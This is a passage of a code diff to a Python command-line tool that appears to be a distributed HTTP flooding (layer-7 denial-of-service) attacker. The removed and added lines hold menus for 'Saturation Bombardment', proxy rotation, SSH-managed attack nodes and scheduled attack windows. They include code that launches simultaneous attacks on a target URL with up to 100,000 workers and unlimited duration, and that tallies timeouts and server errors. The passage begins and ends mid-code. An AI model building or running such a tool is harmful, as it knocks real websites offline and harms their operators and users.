+            for i, n in enumerate(NODE_MANAGER.nodes, 1):
+                print(f"  {i}. {n.label()}")
+            try:
+                idx = int(input(f"  {Colors.BOLD}➜ Node #: {Colors.RESET}").strip()) - 1
+                if 0 <= idx < len(NODE_MANAGER.nodes):
+                    n = NODE_MANAGER.nodes[idx]
+                    label = n.label()
+                    NODE_MANAGER.remove(n)
+                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Removed {label}")
+            except (ValueError, IndexError):
+                print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid selection")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
+        elif choice == "c":
+            if not NODE_MANAGER.nodes:
+                continue
+            confirm = input(f"\n  {Colors.RED}Remove ALL nodes? (y/N): {Colors.RESET}").strip().lower()
+            if confirm == "y":
+                for n in list(NODE_MANAGER.nodes):
+                    NODE_MANAGER.remove(n)
+                print(f"\n  {Colors.GREEN}✓{Colors.RESET} All nodes removed")
+            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
 
 
 async def auto_deploy_saved_nodes():
@@ -3682,493 +2942,12 @@ async def auto_deploy_saved_nodes():
     print(f"  {Colors.DIM}Press Enter to continue to main menu...{Colors.RESET}")
 
     try:
-        safe_input()
-    except MenuBack:
+        input()
+    except (KeyboardInterrupt, EOFError):
         pass
 
 
 async def run_distributed_attack(target_url, concurrency, duration,
                                  use_proxy, safe_mode, nodes, rps=DEFAULT_RPS):
     print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● DISTRIBUTED ATTACK ORCHESTRATOR{Colors.RESET}")
-    print(f"  {Colors.DIM}Master + {len(nodes)} node(s) will attack simultaneously{Colors.RESET}")
-    print(f"  {Colors.DIM}Per-worker RPS: {rps}{Colors.RESET}")
-    print()
-
-    print(f"  {Colors.CYAN}➜ Ensuring nodes are connected...{Colors.RESET}")
-    for n in nodes:
-        if not n.client:
-            await NODE_MANAGER.connect(n)
-
-    proxies_for_nodes = None
-    if use_proxy and PROXY_MANAGER.working_proxies:
-        proxies_for_nodes = list(PROXY_MANAGER.working_proxies)
-        print(f"  {Colors.CYAN}➜ Nodes will route through {len(proxies_for_nodes)} proxies{Colors.RESET}")
-
-    print(f"  {Colors.CYAN}➜ Launching attack on {len(nodes)} node(s)...{Colors.RESET}")
-    started = []
-    for n in nodes:
-        if await NODE_MANAGER.start_attack(n, target_url, concurrency, duration,
-                                           safe_mode, proxies_for_nodes, rps=rps):
-            print(f"    {Colors.GREEN}✓{Colors.RESET} {n.label()}")
-            started.append(n)
-        else:
-            print(f"    {Colors.RED}✗{Colors.RESET} {n.label()} — {n.error_msg or 'failed'}")
-    print()
-    print(f"  {Colors.GREEN}✓{Colors.RESET} {len(started)} node(s) attacking")
-    print()
-
-    await asyncio.sleep(1)
-
-    local_stats = {}
-    stop_done = [False]
-
-    LIVE_DASHBOARD.nodes = list(started)
-
-    async def do_async_stop():
-        if not started:
-            return
-        try:
-            await asyncio.gather(
-                *[NODE_MANAGER.stop_attack(n) for n in started],
-                return_exceptions=True)
-        except Exception:
-            pass
-
-    def do_sync_stop():
-        if not started or stop_done[0]:
-            return
-        stop_done[0] = True
-        try:
-            NODE_MANAGER.force_stop_all_sync(started)
-        except Exception:
-            pass
-
-    async def monitor_nodes():
-        while True:
-            try:
-                results = await asyncio.gather(
-                    *[NODE_MANAGER.poll_attack_status(n) for n in started],
-                    return_exceptions=True)
-            except asyncio.CancelledError:
-                raise
-            except Exception:
-                await asyncio.sleep(5)
-                continue
-
-            for i, n in enumerate(started):
-                if i >= len(results):
-                    continue
-                r = results[i]
-                if isinstance(r, Exception):
-                    continue
-                data = r.get("data", {})
-                try:
-                    n.live_running = r.get("running", False)
-                    n.live_requests = data.get("requests", 0)
-                    n.live_success = data.get("success", 0)
-                    n.live_timeouts = data.get("timeouts", 0)
-                    n.live_srv_err = data.get("srv_err", 0)
-                except Exception:
-                    pass
-
-            await asyncio.sleep(3)
-
-    monitor_task = asyncio.create_task(monitor_nodes())
-
-    interrupted = False
-    try:
-        local_stats = await run_benchmark(target_url, concurrency, duration,
-                                          use_proxy, safe_mode=safe_mode,
-                                          rps=rps, _return_stats=True)
-    except (KeyboardInterrupt, asyncio.CancelledError):
-        interrupted = True
-        print(f"\n  {Colors.YELLOW}⚠ Master interrupted — stopping all nodes NOW...{Colors.RESET}")
-        do_sync_stop()
-        print(f"  {Colors.GREEN}✓{Colors.RESET} Stop signal sent to {len(started)} node(s)")
-        try:
-            await asyncio.wait_for(do_async_stop(), timeout=2)
-        except Exception:
-            pass
-        raise
-    except Exception as e:
-        print(f"\n  {Colors.RED}⚠ Unexpected error on master: {e}{Colors.RESET}")
-        do_sync_stop()
-        raise
-    finally:
-        monitor_task.cancel()
-        try:
-            await monitor_task
-        except asyncio.CancelledError:
-            pass
-
-        if not stop_done[0] and started:
-            print(f"\n  {Colors.CYAN}➜ Stopping node attacks (sync)...{Colors.RESET}")
-            do_sync_stop()
-            print(f"  {Colors.GREEN}✓{Colors.RESET} All nodes stopped")
-
-        LIVE_DASHBOARD.nodes = []
-
-    if interrupted:
-        return
-
-    print(f"  {Colors.CYAN}➜ Fetching final node stats...{Colors.RESET}\n")
-
-    local_stats = local_stats or {}
-    total_req = local_stats.get("requests", 0)
-    total_ok = local_stats.get("success", 0)
-    total_to = local_stats.get("timeouts", 0)
-    total_5xx = local_stats.get("server_error", 0)
-
-    print(f"  {Colors.BOLD}{Colors.MAGENTA}● CLUSTER FINAL REPORT{Colors.RESET}\n")
-    print(f"  {Colors.BOLD}▸ MASTER (local){Colors.RESET}")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Requests     {Colors.BOLD}{local_stats.get('requests', 0)}{Colors.RESET}")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Hits 200     {Colors.GREEN}{local_stats.get('success', 0)}{Colors.RESET}")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Timeouts     {Colors.RED}{local_stats.get('timeouts', 0)}{Colors.RESET}")
-    print(f"  {Colors.DIM}└─{Colors.RESET} Server 5xx   {Colors.RED}{local_stats.get('server_error', 0)}{Colors.RESET}")
-    print()
-
-    node_stats_list = []
-    for n in started:
-        try:
-            r = await NODE_MANAGER.poll_attack_status(n)
-            data = r.get("data", {})
-        except Exception:
-            data = {}
-        node_stats_list.append((n, data))
-        total_req += data.get("requests", 0)
-        total_ok += data.get("success", 0)
-        total_to += data.get("timeouts", 0)
-        total_5xx += data.get("srv_err", 0)
-
-        print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Requests     {Colors.BOLD}{data.get('requests', 0)}{Colors.RESET}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Hits 200     {Colors.GREEN}{data.get('success', 0)}{Colors.RESET}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Timeouts     {Colors.RED}{data.get('timeouts', 0)}{Colors.RESET}")
-        print(f"  {Colors.DIM}└─{Colors.RESET} Server 5xx   {Colors.RED}{data.get('srv_err', 0)}{Colors.RESET}")
-        print()
-
-    print(f"  {Colors.BOLD}{Colors.MAGENTA}● COMBINED TOTAL{Colors.RESET}\n")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Total Requests   {Colors.BOLD}{total_req}{Colors.RESET}")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Total Hits 200   {Colors.GREEN}{total_ok}{Colors.RESET}")
-    print(f"  {Colors.DIM}├─{Colors.RESET} Total Timeouts   {Colors.RED}{total_to}{Colors.RESET}")
-    print(f"  {Colors.DIM}└─{Colors.RESET} Total 5xx        {Colors.RED}{total_5xx}{Colors.RESET}")
-
-    combined = {
-        "master": local_stats,
-        "nodes": [{"label": n.label(), "stats": d} for n, d in node_stats_list],
-        "total": {
-            "requests": total_req,
-            "success": total_ok,
-            "timeouts": total_to,
-            "server_errors": total_5xx,
-        }
-    }
-    save_json_report("distributed", combined)
-
-
-async def run_scheduled_attack(target_url, concurrency, use_proxy,
-                               safe_mode, nodes, rps):
-    print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● SCHEDULED ATTACK MODE{Colors.RESET}")
-    print(f"  {Colors.DIM}The attack will only run during scheduled windows.{Colors.RESET}")
-    print(f"  {Colors.DIM}Timezone: {Colors.RESET}{tz_label()}\n")
-
-    while True:
-        if _INTERRUPTED[0]:
-            return
-        now = now_dt()
-        window = SCHEDULE.next_window(now)
-        if window is None:
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} No future scheduled windows. Exiting scheduler.")
-            return
-
-        s, e = window
-        if s > now:
-            wait = (s - now).total_seconds()
-            print(f"  {Colors.CYAN}➜ Next window: "
-                  f"{s.strftime('%Y-%m-%d %H:%M')} → {e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
-            print(f"  {Colors.DIM}Waiting {int(wait // 3600):02d}:"
-                  f"{int((wait % 3600) // 60):02d}:{int(wait % 60):02d}...{Colors.RESET}")
-            await interruptible_sleep(wait)
-            if _INTERRUPTED[0]:
-                return
-            now = now_dt()
-            window = SCHEDULE.next_window(now)
-            if window is None:
-                continue
-            s, e = window
-
-        duration = (e - now_dt()).total_seconds()
-        if duration <= 1:
-            await asyncio.sleep(1)
-            continue
-
-        print(f"\n  {Colors.GREEN}➜ Window active: "
-              f"{s.strftime('%H:%M')} → {e.strftime('%H:%M')} "
-              f"({int(duration)}s / {duration / 60:.1f} min){Colors.RESET}\n")
-        time.sleep(1)
-
-        try:
-            if nodes:
-                await run_distributed_attack(target_url, concurrency, duration,
-                                              use_proxy, safe_mode, nodes, rps=rps)
-            else:
-                await run_benchmark(target_url, concurrency, duration,
-                                    use_proxy, safe_mode=safe_mode, rps=rps)
-        except (KeyboardInterrupt, asyncio.CancelledError):
-            return
-        except Exception as ex:
-            print(f"\n  {Colors.RED}⚠ Window error: {ex}{Colors.RESET}")
-            time.sleep(3)
-            continue
-
-        if _INTERRUPTED[0]:
-            return
-        await asyncio.sleep(2)
-
-
-def get_target_url():
-    while True:
-        url = safe_input(f"  {Colors.BOLD}➜ Target Subscription URL: {Colors.RESET}").strip()
-        if url.startswith("http://") or url.startswith("https://"):
-            return url
-        print(f"  {Colors.RED}⚠ Invalid URL{Colors.RESET}")
-
-
-def get_int_input(prompt, default, allow_zero=False, max_val=None):
-    while True:
-        raw = safe_input(prompt).strip()
-        if not raw:
-            return default
-        try:
-            val = int(raw)
-            if val > 0:
-                if max_val is not None and val > max_val:
-                    val = max_val
-                return val
-            if allow_zero and val == 0:
-                return 0
-            if allow_zero:
-                print(f"  {Colors.RED}⚠ Must be a positive integer or 0 for unlimited{Colors.RESET}")
-            else:
-                print(f"  {Colors.RED}⚠ Must be a positive integer{Colors.RESET}")
-        except ValueError:
-            print(f"  {Colors.RED}⚠ Invalid number{Colors.RESET}")
-
-
-def main_menu():
-    raise_fd_limit()
-
-    if NODE_MANAGER.nodes and PARAMIKO_AVAILABLE:
-        try:
-            asyncio.run(auto_deploy_saved_nodes())
-        except MenuBack:
-            _restore_terminal()
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Auto-deploy skipped")
-            time.sleep(0.4)
-        except KeyboardInterrupt:
-            _restore_terminal()
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Auto-deploy skipped")
-            time.sleep(0.4)
-        except Exception as e:
-            print(f"\n  {Colors.RED}⚠{Colors.RESET} Auto-deploy error: {e}")
-            time.sleep(1)
-
-    while True:
-        try:
-            _INTERRUPTED[0] = False
-            print_banner()
-            ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
-            print(f"  {Colors.BOLD}● SELECT ATTACK MODULE{Colors.RESET}\n")
-            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Saturation Bombardment          {Colors.DIM}→ L7 high-concurrency{Colors.RESET}")
-            print(f"  {Colors.YELLOW}  [2]{Colors.RESET}  Proxy Management                {Colors.DIM}→ rotation control{Colors.RESET}")
-            print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Node Management                 {Colors.DIM}→ distributed cluster{Colors.RESET}")
-            print(f"  {Colors.GREEN}  [4]{Colors.RESET}  Schedule Management             {Colors.DIM}→ attack time windows{Colors.RESET}")
-            print(f"  {Colors.RED}  [0]{Colors.RESET}  Exit")
-            print()
-
-            if PROXY_MANAGER.working_proxies:
-                print(f"  {Colors.DIM}●{Colors.RESET} Proxy pool  "
-                      f"{Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} alive{Colors.RESET}  "
-                      f"{Colors.DIM}|{Colors.RESET}  mode: {Colors.YELLOW}{PROXY_MANAGER.rotation_mode}{Colors.RESET}")
-            else:
-                print(f"  {Colors.DIM}●{Colors.RESET} Proxy pool  {Colors.DIM}empty — direct mode only{Colors.RESET}")
-
-            if NODE_MANAGER.nodes:
-                print(f"  {Colors.DIM}●{Colors.RESET} Node cluster  "
-                      f"{Colors.GREEN}{len(ready_nodes)} ready{Colors.RESET}  "
-                      f"{Colors.DIM}|{Colors.RESET}  total: {Colors.MAGENTA}{len(NODE_MANAGER.nodes)}{Colors.RESET}")
-            else:
-                print(f"  {Colors.DIM}●{Colors.RESET} Node cluster  {Colors.DIM}empty — single-server mode{Colors.RESET}")
-
-            if SCHEDULE.is_empty():
-                print(f"  {Colors.DIM}●{Colors.RESET} Schedule     {Colors.DIM}empty — no time windows{Colors.RESET}")
-            else:
-                print(f"  {Colors.DIM}●{Colors.RESET} Schedule     "
-                      f"{Colors.GREEN}{len(SCHEDULE.slots)} slot(s) configured{Colors.RESET}")
-
-            print(f"  {Colors.DIM}●{Colors.RESET} Timezone     {tz_label()}")
-            print()
-            print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
-
-            choice = safe_input(f"\n  {Colors.BOLD}➜ Choose module [1]: {Colors.RESET}").strip() or "1"
-
-            if choice == "0":
-                sys.exit(0)
-            elif choice == "2":
-                try:
-                    asyncio.run(proxy_management_menu())
-                except MenuBack:
-                    _restore_terminal()
-                    continue
-                continue
-            elif choice == "3":
-                try:
-                    asyncio.run(node_management_menu())
-                except MenuBack:
-                    _restore_terminal()
-                    continue
-                continue
-            elif choice == "4":
-                try:
-                    asyncio.run(schedule_management_menu())
-                except MenuBack:
-                    _restore_terminal()
-                    continue
-                continue
-                continue
-            elif choice != "1":
-                print(f"  {Colors.RED}⚠ Invalid choice{Colors.RESET}")
-                time.sleep(1)
-                continue
-
-            print(f"\n  {Colors.BOLD}● TARGET CONFIGURATION{Colors.RESET}\n")
-            try:
-                target_url = get_target_url()
-                concurrency = get_int_input(
-                    f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}{DEFAULT_WORKERS}{Colors.RESET}]: ",
-                    DEFAULT_WORKERS, max_val=100000)
-                rps = get_int_input(
-                    f"  {Colors.BOLD}➜ Per-Worker RPS (0=unlimited) [{Colors.GREEN}{DEFAULT_RPS}{Colors.RESET}]: ",
-                    DEFAULT_RPS, allow_zero=True, max_val=100000)
-
-                use_schedule = False
-                duration = None
-                duration_disp = ""
-
-                if not SCHEDULE.is_empty():
-                    print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● SCHEDULE DETECTED{Colors.RESET}")
-                    print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
-                    for i, desc in enumerate(SCHEDULE.describe(), 1):
-                        print(f"  {Colors.CYAN}{i:>2}.{Colors.RESET} {desc}")
-                    nxt = SCHEDULE.next_window()
-                    if nxt:
-                        s, e = nxt
-                        now = now_dt()
-                        if s <= now < e:
-                            print(f"\n  {Colors.GREEN}▶ Active NOW until "
-                                  f"{e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
-                        else:
-                            print(f"\n  {Colors.YELLOW}▶ Next window: "
-                                  f"{s.strftime('%Y-%m-%d %H:%M')} → "
-                                  f"{e.strftime('%Y-%m-%d %H:%M')}{Colors.RESET}")
-                    print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
-                    ans = safe_input(f"\n  {Colors.BOLD}➜ Use this schedule? "
-                                     f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
-                    use_schedule = (ans != "n")
-
-                if use_schedule:
-                    duration = 0
-                    duration_disp = "scheduled windows"
-                else:
-                    duration_min = get_int_input(
-                        f"  {Colors.BOLD}➜ Attack Duration (minutes, 0=unlimited) [{Colors.GREEN}{DEFAULT_DURATION_MIN}{Colors.RESET}]: ",
-                        DEFAULT_DURATION_MIN, allow_zero=True, max_val=60 * 24 * 365)
-                    if duration_min == 0:
-                        duration = 86400 * 365
-                        duration_disp = "unlimited"
-                    else:
-                        duration = duration_min * 60
-                        duration_disp = f"{duration_min} min"
-
-                ans_safe = safe_input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
-                                      f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
-                                      f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
-                safe_mode = ans_safe == "y"
-
-                use_proxy = False
-                if PROXY_MANAGER.working_proxies:
-                    ans = safe_input(f"  {Colors.BOLD}➜ Use proxy rotation? "
-                                     f"({Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} available{Colors.RESET}) "
-                                     f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
-                    use_proxy = (ans != "n")
-                else:
-                    print(f"  {Colors.DIM}● No working proxies loaded — direct mode{Colors.RESET}")
-
-                ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
-                use_nodes = False
-                if ready_nodes:
-                    total_workers = concurrency * (1 + len(ready_nodes))
-                    print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER AVAILABLE{Colors.RESET}")
-                    print(f"  {Colors.DIM}├─{Colors.RESET} Ready nodes      {Colors.BOLD}{len(ready_nodes)}{Colors.RESET}")
-                    print(f"  {Colors.DIM}├─{Colors.RESET} Workers per node {Colors.BOLD}{concurrency}{Colors.RESET}")
-                    print(f"  {Colors.DIM}└─{Colors.RESET} Total workers    {Colors.BOLD}{Colors.GREEN}{total_workers}{Colors.RESET}")
-                    ans = safe_input(f"\n  {Colors.BOLD}➜ Distribute attack across {len(ready_nodes)} node(s)? "
-                                     f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
-                    use_nodes = (ans != "n")
-
-                print(f"\n  {Colors.DIM}● Duration: {Colors.BOLD}{duration_disp}{Colors.RESET}")
-            except MenuBack:
-                _restore_terminal()
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Configuration canceled — returning to menu")
-                time.sleep(0.4)
-                continue
-
-            try:
-                if use_schedule:
-                    asyncio.run(run_scheduled_attack(
-                        target_url, concurrency, use_proxy, safe_mode,
-                        ready_nodes if use_nodes else None, rps=rps))
-                elif use_nodes:
-                    asyncio.run(run_distributed_attack(
-                        target_url, concurrency, duration,
-                        use_proxy, safe_mode, ready_nodes, rps=rps))
-                else:
-                    asyncio.run(run_benchmark(target_url, concurrency, duration,
-                                              use_proxy, safe_mode=safe_mode, rps=rps))
-            except KeyboardInterrupt:
-                _restore_terminal()
-                print(f"\n\n  {Colors.YELLOW}⚠{Colors.RESET} Attack aborted.")
-                if use_nodes and ready_nodes:
-                    print(f"  {Colors.CYAN}➜ Fallback: stopping nodes...{Colors.RESET}")
-                    try:
-                        NODE_MANAGER.force_stop_all_sync(ready_nodes)
-                        print(f"  {Colors.GREEN}✓{Colors.RESET} Stop signal sent")
-                    except Exception:
-                        pass
-                time.sleep(0.5)
-                continue
-
-            try:
-                safe_input(f"\n  {Colors.DIM}Press Enter to return to menu...{Colors.RESET}")
-            except MenuBack:
-                _restore_terminal()
-                continue
-
-        except MenuBack:
-            _restore_terminal()
-            print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
-            sys.exit(0)
-        except KeyboardInterrupt:
-            _restore_terminal()
-            print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
-            sys.exit(0)
-
-
-if __name__ == "__main__":
-    _init_tehran_zone()
-    load_timezone()
-    try:
-        main_menu()
-    except KeyboardInterrupt:
-        _restore_terminal()
-        print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
+    print(f"  {Colors.DIM}Master + {len(nodes)}
